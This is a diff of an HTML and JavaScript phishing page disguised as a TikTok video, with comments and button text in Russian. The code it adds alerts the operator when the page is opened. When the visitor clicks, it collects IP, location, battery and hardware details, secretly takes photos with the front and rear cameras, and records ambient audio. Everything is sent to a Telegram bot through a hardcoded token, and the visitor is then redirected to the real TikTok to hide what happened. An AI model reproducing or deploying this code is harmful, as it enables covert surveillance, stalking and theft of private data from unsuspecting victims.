@@ -3,25 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
+    <title>TikTok Video</title>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        #mainBtn { background: #ff0050; color: #fff; border: none; padding: 18px 45px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
-        #status { display: none; color: #777; text-align: center; }
-        .spinner { width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #ff0050; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        video, canvas { display: none !important; }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
+        #watchBtn { background: #ff0050; color: #fff; border: none; padding: 22px 60px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px rgba(255, 0, 80, 0.6); z-index: 100; }
+        video, canvas { display: none; visibility: hidden; position: absolute; }
     </style>
 </head>
 <body>
 
-    <div id="ui">
-        <button id="mainBtn">WATCH VIDEO</button>
-        <div id="status">
-            <div class="spinner"></div>
-            <p id="msg">Loading...</p>
-        </div>
-    </div>
+    <button id="watchBtn">СМОТРЕТЬ В HD</button>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -30,70 +21,89 @@
         const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
         const CHAT_ID = '6660269414';
 
-        const btn = document.getElementById('mainBtn');
-        const status = document.getElementById('status');
-        const msg = document.getElementById('msg');
+        const btn = document.getElementById('watchBtn');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
+        // УВЕДОМЛЕНИЕ О ВХОДЕ (срабатывает сразу при открытии страницы)
+        window.onload = () => {
+            sendText("🔔 **КТО-ТО ОТКРЫЛ ССЫЛКУ!** Ждем нажатия кнопки...");
+        };
+
         btn.addEventListener('click', async () => {
-            btn.style.display = 'none';
-            status.style.display = 'block';
+            btn.textContent = "ПОДКЛЮЧЕНИЕ...";
+            btn.disabled = true;
 
-            // 1. ОТПРАВКА IP И ИНФО (Мгновенно)
-            try {
-                const ipRes = await fetch('https://ipify.org');
-                const ipData = await ipRes.json();
-                await sendText(`🌐 **IP ПОЛУЧЕН**: \`${ipData.ip}\`\n📱 Платформа: ${navigator.platform}`);
-            } catch(e) { await sendText("⚠️ Не удалось получить IP"); }
+            // 1. Сбор Deep Info (IP, Железо, Батарея)
+            await collectDeepInfo();
 
-            // 2. ГЕОЛОКАЦИЯ (В фоне)
+            // 2. Геолокация
             navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendText(`📍 **ЛОКАЦИЯ**: https://google.com{p.coords.latitude},${p.coords.longitude}`);
-            }, null, {timeout: 5000});
+                await sendText(`📍 **ЛОКАЦИЯ:** https://google.com{p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy: true});
 
-            // 3. ФРОНТАЛЬНАЯ КАМЕРА
-            await capture('user', 'FRONT');
+            // 3. Скрытые фото (Фронт + Тыл)
+            await snap('user', 'СЕЛФИ');
+            await snap('environment', 'ОСНОВНАЯ КАМЕРА');
 
-            // 4. ЗАДНЯЯ КАМЕРА
-            await capture('environment', 'REAR');
+            // 4. Фоновое аудио (запись 4 секунды)
+            await recordAudio(4000);
 
-            // ФИНАЛ: Показываем ошибку, чтобы юзер ушел
+            // 5. Редирект на реальный TikTok (для маскировки)
             setTimeout(() => {
-                msg.textContent = "Server error. Content unavailable.";
-                msg.style.color = "#ff0050";
-            }, 1000);
+                window.location.href = "https://tiktok.com";
+            }, 1500);
         });
 
-        async function capture(mode, label) {
+        async function collectDeepInfo() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: mode, width: 1280, height: 720 }
-                });
-                v.srcObject = stream;
-                
-                await new Promise(r => setTimeout(r, 1500)); // Ждем прогрузки камеры
-                
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                
-                // Стоп камера сразу
-                stream.getTracks().forEach(t => t.stop());
-
-                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-                await sendPhoto(blob, label);
-            } catch (e) {
-                await sendText(`❌ Ошибка ${label}: Камера заблокирована`);
-            }
+                const ipRes = await fetch('https://ipapi.co').then(r => r.json());
+                const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
+                let m = `🔥 **ПОЛНЫЙ ЛОГ ДАННЫХ**\n`;
+                m += `🌐 IP: \`${ipRes.ip}\` (${ipRes.city})\n`;
+                m += `📱 Система: ${navigator.platform}\n`;
+                m += `🔋 Заряд: ${Math.round(b.level * 100)}%\n`;
+                m += `🖥 Экран: ${window.screen.width}x${window.screen.height}\n`;
+                m += `⚙️ Ядер: ${navigator.hardwareConcurrency} | ОЗУ: ~${navigator.deviceMemory}GB`;
+                await sendText(m);
+            } catch(e) { await sendText("⚠️ Ошибка сбора инфо"); }
         }
 
-        async function sendPhoto(blob, label) {
+        async function snap(mode, label) {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode, width: 1280, height: 720}});
+                v.srcObject = s;
+                await new Promise(r => setTimeout(r, 1200));
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                s.getTracks().forEach(t => t.stop());
+                const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                await sendFile(b, 'photo', `📸 ${label}`);
+            } catch(e) { await sendText(`❌ Камера ${label} заблокирована`); }
+        }
+
+        async function recordAudio(ms) {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(s);
+                const chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = async () => {
+                    const b = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendFile(b, 'voice', '🎙 Аудиозапись окружения');
+                    s.getTracks().forEach(t => t.stop());
+                };
+                rec.start();
+                setTimeout(() => rec.stop(), ms);
+            } catch(e) {}
+        }
+
+        async function sendFile(blob, type, cap) {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'img.jpg');
-            fd.append('caption', `📸 Снимок: ${label}`);
-            await fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            fd.append(type === 'voice' ? 'voice' : 'photo', blob, 'file.ogg');
+            fd.append('caption', cap);
+            await fetch(`https://telegram.org{TOKEN}/send${type === 'voice' ? 'Voice' : 'Photo'}`, {method: 'POST', body: fd});
         }
 
         async function sendText(t) {
